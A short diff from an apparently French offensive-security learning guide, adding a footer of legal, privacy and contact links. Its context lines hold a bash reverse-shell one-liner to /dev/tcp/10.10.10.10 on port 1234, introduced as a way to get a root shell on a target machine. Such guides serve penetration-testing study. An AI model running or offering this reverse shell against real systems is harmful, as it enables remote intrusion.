@@ -328,3 +328,11 @@ commande pour activer un shell root via nc (à faire sur machine cible):
 ```bash
 echo 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
+
+***
+
+**Liens utiles :**
+
+* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
+* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
+* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
